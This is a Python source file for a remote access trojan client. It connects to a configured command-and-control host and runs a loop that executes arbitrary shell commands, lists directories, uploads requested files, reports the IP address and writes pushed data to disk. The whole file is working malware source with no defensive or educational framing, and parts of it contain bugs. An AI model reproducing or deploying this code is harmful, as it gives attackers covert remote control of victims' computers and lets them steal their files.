import socket
import hashlib
import random
import json
import time
import os
import typing

from subprocess import getoutput
from gtts import gTTS
from .confs import Configs

types = typing.Literal[
    'files',
    'folders',
    'all'
]

the_modes = typing.Literal[
    'in_front_of',
    'on_call',
    'equals_with'
]

class BufferList(object):
    def __init__(self,
                 List: list = [],
                 ):
        
        self.list = List
        
    def parse(self):
        bfd = {}

        for i in range(len(self.list)):
            bfd[str(i+1)] = self.list[i]

        return bfd

    def isexists(self, target):
        if target in self.list:
            return True
        else:return False

    def isinfrontof(self, target, indexes):
        isit = False

        if target in self.list:
            try:
                indx = self.list.index(target)
                if indx == indexes:
                    isit = True
                else:isit = False
            except Exception as e:return e
        
        return isit
    
    def indexexists(self, target):
        if target in self.list:
            return self.list.index(target)
        else:return False

class Things(object):
    def __init__(self) -> None:
        self.def_attrs = ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']

    def __str__(self) -> str:
        return json.dumps(dir(self), indent=2)
    
    @property
    def options(self) -> list:
        opts = []

        for item in dir(self):
            if item.startswith("__") and item in self.def_attrs:pass
            else:opts.append(item)

        opts.remove("def_attrs")
        opts.remove("options")
        
        return opts
    
class BufferString(object):
    def __init__(self, string: str):
        assert isinstance(string, str), exit("The Self@BufferString did not get a string value")
        self.string = string.split()
        self.last_things = Things()
        self.handlers = []
        self.buffer_list = BufferList
        self.modes = [
            'in_front_of',
            'on_call'
        ]
        self.string_abs = [
            "str",
            "string",
            "strings"
        ]
        self.int_abs = [
            "int",
            "integer",
            "number"
        ]
        self.dict_abs = [
            "dict",
            "dictionary",
            "json"
        ]
        self.bool_abs = [
            "bool",
            "boolean",
            "true-false"
        ]
    
    def getDictArgv(self):
        return BufferList(self.string).parse()
    
    def isArray(self, array: str):
        try:
            return {"is_array": True, "array": json.loads(array)}
        except:return {"is_array": False}

    def isBoolean(self, boolean: str):
        try:
            if boolean.startswith("t"):
                return {"is_boolean": True, "boolean": bool("T"+boolean[1:])}
            elif boolean.startswith("f"):
                return {"is_boolean": True, "boolean": bool("F"+boolean[1:])}
            else:return {"is_boolean": True, "boolean": bool(boolean)}
        except:return {"is_boolean": False}
    
    def addFlag(self, *flags, mode: the_modes = "in_front_of", obj_type: str = "str"):
        def decorator(func):
            self.handlers.append({func: {"flags": list(set(flags)), "mode": mode, "type": obj_type.lower()}})
            return func
        return decorator
    
    def setFilter(self, flags_list: list, err_message: str, _exit: bool = True):
        """
        Check The all arguments and detect the mistakes\n

        Use 'B@ARGV' key word in your err_message to see invalid argument:\n

        buffer.setFilter(\n
            flags_list=[ '-h', '--help' ],\n
            err_message="Invalid Key: B@ARGV",
            _exit=True
            )

        Parameters:
            - **flags_list** (list): The flags used in the script.
            - **err_message** (str): Message printed if an invalid argument is detected.
            - **_exit** (bool): If True, the program will terminate upon detecting an invalid argument.
        """

        flags = list(set(flags_list))
        argvs = self.string

        for argv in argvs:
            if argv.startswith("-"):
                if not argv in flags:
                    print(err_message.replace("B@ARGV", argv))

                    if _exit:
                        exit(1)

    def trust(self):
        for handler in self.handlers:
            func = list(handler.keys())[0]
            flags = handler[func]['flags']
            mode = handler[func]['mode']
            type = handler[func]['type']

            argv = self.buffer_list(self.string).parse()
            arg_key = list(argv.keys())
            arg_val = list(argv.values())

            if mode == "in_front_of":

                for flag in flags:

                    setattr(self.last_things, flag.replace("-", "").replace("/", ""), "NONECALL")

                    if flag in arg_val:
                        arg_index = arg_val.index(flag)
                        ifo_key = str(arg_index+2)
                        cleared_key = argv[str(arg_index+1)].replace("-", "").replace("/", "")

                        if ifo_key in arg_key:

                            if type in self.string_abs:
                                setattr(self.last_things, cleared_key, argv[ifo_key])
                                
                            elif type in self.int_abs:
                                if argv[ifo_key].isdigit():
                                    setattr(self.last_things, cleared_key, int(argv[ifo_key]))
                                else:setattr(self.last_things, cleared_key, argv[ifo_key])

                            elif type in self.dict_abs:
                                status = self.isArray(argv[ifo_key])

                                if status['is_array']:
                                    setattr(self.last_things, cleared_key, status['array'])
                                else:setattr(self.last_things, cleared_key, argv[ifo_key])
                                
                            elif type in self.bool_abs:
                                status = self.isBoolean(argv[ifo_key])

                                if status['is_boolean']:
                                    setattr(self.last_things, cleared_key, status['boolean'])
                                else:setattr(self.last_things, cleared_key, argv[ifo_key])
                        else:
                            setattr(self.last_things, cleared_key, "Null")

            elif mode == "on_call":
                for flag in flags:

                    setattr(self.last_things, flag.replace("-", "").replace("/", ""), "NONECALL")

                    if flag in arg_val:
                        arg_index = arg_val.index(flag)
                        k = argv[str(arg_index+1)]
                        cleared_key = k.replace("-", "").replace("/", "")

                        if k in arg_val:
                            setattr(self.last_things, cleared_key, True)

                        else:
                            setattr(self.last_things, cleared_key, False)

            elif mode == "equals_with":
                for flag in flags:
                    setattr(self.last_things, flag.replace("-", "").replace("/", ""), "NONECALL")
                    for arg in self.string:
                        if arg.startswith(flag):
                            if "=" in arg:
                                splitted_data = arg.split("=")[-1]

                                if type in self.string_abs:
                                    setattr(self.last_things, flag.replace("-", "").replace("/", ""), splitted_data)

                                elif type in self.int_abs:
                                    if splitted_data.isdigit():
                                        setattr(self.last_things, flag.replace("-", "").replace("/", ""), int(splitted_data))
                                    else:
                                        setattr(self.last_things, flag.replace("-", "").replace("/", ""), splitted_data)

                                elif type in self.dict_abs:
                                    status = self.isArray(splitted_data)
                                    
                                    if status['is_array']:
                                        setattr(self.last_things, flag.replace("-", "").replace("/", ""), status['array'])
                                    else:setattr(self.last_things, flag.replace("-", "").replace("/", ""), splitted_data)
                                
                                elif type in self.bool_abs:
                                    status = self.isBoolean(splitted_data)

                                    if status['is_boolean']:
                                        setattr(self.last_things, flag.replace("-", "").replace("/", ""), status['boolean'])
                                    else:setattr(self.last_things, flag.replace("-", "").replace("/", ""), splitted_data)
                                else:setattr(self.last_things, flag.replace("-", "").replace("/", ""), splitted_data)
                            else:setattr(self.last_things, flag.replace("-", "").replace("/", ""), "NONEEQUALS")
                        
            func(self.last_things)

class SeptemUtils(object):
    def __init__(self) -> None:pass

    def fetch(self, type: types, dir: str = ".") -> typing.Dict:
        last_data = { "files": [], "folders": [], "filter": type }

        if os.path.exists(dir):
            if os.path.isdir(dir):
                os.chdir(dir)

        if last_data["filter"] == "files":
            for root, dirs, files in os.walk(".", topdown=False):
                for nameX in files:
                    dataFile = (os.path.join(root, nameX))
                    last_data["files"].append(dataFile)
            
            del last_data['folders']
        
        elif last_data["filters"] == "folders":
            for root, dirs, files in os.walk(".", topdown=False):
                for name in dirs:
                    dataFolder = (os.path.join(root, name))
                    last_data['folders'].append(dataFolder)

        else:
            for root, dirs, files in os.walk(".", topdown=False):
                for nameX in files:
                    dataFile = (os.path.join(root, nameX))
                    last_data["files"].append(dataFile)
                
                for name in dirs:
                    dataFolder = (os.path.join(root, name))
                    last_data['folders'].append(dataFolder)

        return last_data

    def execution(self, text: str):
        return getoutput(text)
    
    def convert(self, text: str):
        speech = gTTS(text=text, lang="en", slow=False)
        fname = random.randint(0, 1000000000)
        speech.save(f"horror_{fname}.mp3")
        os.system(f"start {fname}")
        os.remove(fname)

def createUid():
    md5 = hashlib.md5()
    md5.update(str(random.randint(0, 1000000000000000000000)).encode())
    return md5.hexdigest()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostbyname(socket.gethostname())

s.connect((Configs.HOST, int(Configs.PORT)))
connected_uid = createUid()
address = (Configs.HOST, int(Configs.PORT))
uptime = time.ctime(time.time())
septem = SeptemUtils()

while 1:
    msg = s.recv(1024).decode('ascii').strip()

    if not msg == "":
        buffer = BufferString(msg)

        @buffer.addFlag("--dir", mode="equals_with")
        def selectDir(obj):
            if not hasattr(obj, "dir"):
                setattr(obj, "dir", ".")
            
        @buffer.addFlag("--type", mode="equals_with")
        def selectType(obj):
            if not hasattr(obj, "type"):
                setattr(obj, "type", "all")
        

        @buffer.addFlag("/alive", mode="on_call")
        def onAlive(obj):
            if not obj.alive == "NONECALL" and obj.alive == True:
                s.sendto(json.dumps({"local_error": False, "result": {"is_alive": True, "uid": connected_uid, "uptime": uptime}}).encode("ascii"), address)

        @buffer.addFlag("/fetch", mode="on_call")
        def onFetch(obj):
            ctype: types = obj.type

            if not obj.fetch == "NONECALL" and obj.fetch == True:

                if ctype == "all":
                    s.sendto(json.dumps({"local_error": False, "result": septem.fetch("all", obj.dir)}).encode("ascii"), address)
                
                elif ctype == "files":
                    s.sendto(json.dumps({"local_error": False, "result": septem.fetch("files", obj.dir)}).encode("ascii"), address)

                elif ctype == "folders":
                    s.sendto(json.dumps({"local_error": False, "result": septem.fetch("folders", obj.dir)}).encode("ascii"), address)
                
                else:
                    s.sendto(json.dumps({"local_error": False, "result": septem.fetch(dir=obj.dir)}).encode("ascii"), address)

        @buffer.addFlag("/download", mode="equals_with")
        def onDownload(obj):
            if not obj.download in ( "NONECALL", "NONEEQUALS" ):
                if os.path.exists(obj.download):
                    if os.path.isfile(obj.download):
                        s.sendto(open(obj.download, "rb").read().encode("ascii"), address)
                    else:s.sendto(json.dumps({"local_error": True, "message": "Path is not File"}).encode("ascii"), address)
                else:s.sendto(json.dumps({"local_error": True, "message": "Path Does not exists"}).encode("ascii"), address)

        @buffer.addFlag("/getip", mode="on_call")
        def onGettingIp(obj):
            if not obj.getip == "NONECALL" and obj.getip == True:
                s.sendto(json.dumps({"local_error": False, "result": {"ip": socket.gethostbyname(socket.gethostname())}}).encode("ascii"), address)

        if not msg.startswith("{") and not msg.endswith("}"):
            if msg.startswith("/exec"):
                text = msg[6:].strip()
                if text == "":pass
                else:s.sendto(json.dumps({"local_error": False, "result": {"output": septem.execution(text=text)}}).encode("ascii"), address)
            
            elif msg.startswith("/play"):
                play_text = msg[6:].strip()
                if text == "":pass
                else:
                    septem.convert(play_text)
                    s.sendto(json.dumps({"local_error": False, "result": {"text": play_text, "played": True}}))

            else:
                try:
                    open("new_file_{}".format(random.randint(0, 32323222222222)), 'wb').write(msg)
                    s.sendto(json.dumps({"local_error": False, "result": {"writed": True, "file_name": "new_file_{}".format(random.randint(0, 32323222222222))}}).encode("ascii"), address)
                    
                    # Countinue ...
                except Exception as ErrorData:
                    s.sendto(json.dumps({"local_error": True, "message": str(ErrorData)}).encode("ascii"), address)